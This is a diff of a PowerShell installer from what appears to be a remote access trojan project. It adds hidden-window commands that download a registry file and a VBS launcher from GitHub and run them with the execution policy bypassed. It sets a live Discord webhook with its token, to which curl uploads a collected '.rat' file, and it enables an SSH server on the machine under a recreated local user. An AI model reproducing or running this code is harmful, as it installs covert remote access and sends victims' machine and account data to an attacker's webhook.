@@ -29,10 +29,11 @@ Remove-LocalUser -Name $sqbXFdLvyw
 $HcMjDkGFes = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
 geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $HcMjDkGFes
 
-# download and run registry
-powershell -c powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/key_logger/registry/registry.ps1' -OutFile 'registry.ps1'"
-powershell -c powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/key_logger/registry/auto_excutive.vbs' -OutFile 'excutive.vbs'"
-powershell.exe -windowstyle hidden -ep unrestricted ./registry.ps1; powershell.exe -windowstyle hidden -ep unrestricted ./excutive.vbs
+
+# registry
+powershell -c powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/registry/hideuser.reg' -OutFile 'hideuser.reg'"
+powershell -c powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/registry/auto_excutive.vbs' -OutFile 'excutive.vbs'"
+powershell.exe -windowstyle hidden -ep unrestricted ./hideuser.reg; powershell.exe -windowstyle hidden -ep unrestricted ./excutive.vbs
 
 # ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
@@ -54,7 +55,7 @@ Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # remote port
 Add-Content -Path $CRYnrkaDbe -Value 'local' -Force # connection type
 
 # send file to webhook
-$link = ""
+$link = "https://discord.com/api/webhooks/1182206285043728434/wNxaBaI78nxyhnhFcDgM1sSNnaYV0S0ECCjHGTHPCl4PMrbVUyiVoqlYfUNSTij5Bxrc"
 Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"admin\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:username.rat```" $link"
 
 #create payloads folder
@@ -63,7 +64,7 @@ mkdir happy
 mkdir sad
 
 # cleanup
-attrib +h +s +r C:/Users/admin
+# attrib +h +s +r C:/Users/admin
 Set-Location $location
 Remove-Item $CRYnrkaDbe -Force
 Remove-Item install.ps1 -Force
